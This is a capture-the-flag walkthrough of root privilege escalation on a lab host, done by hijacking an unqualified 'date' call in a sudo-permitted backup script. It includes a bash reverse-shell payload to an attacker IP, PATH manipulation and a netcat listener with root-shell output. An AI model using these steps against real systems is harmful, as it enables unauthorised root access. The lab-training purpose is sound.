Run sudo -l as user m4lwhere to see what this user can execute as root
```bash
m4lwhere@previse:/$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
The script that m4lwhere can run as root:
```bash
m4lwhere@previse:/$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
The command substitution of ```$(date ...)``` is interesting because it doesn't specify the full path for the binary

Create a binary called date that will trigger a reverse shell and put it in /dev/shm
```bash
m4lwhere@previse:/$ cat /dev/shm/date 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.102/9001 0>&1
```
Then, append /dev/shm to the path environment variable
```bash
m4lwhere@previse:/$ PATH=/dev/shm:$PATH
m4lwhere@previse:/$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
Now the sudo command must be ran **outside** of the /dev/shm directory for this to work, due to sudo always looking in current directory last for executables. Just start a listener on the attacking machine and run the script as root for the root shell.
```bash
-> % nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.102] from (UNKNOWN) [10.10.11.104] 53902
root@previse:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
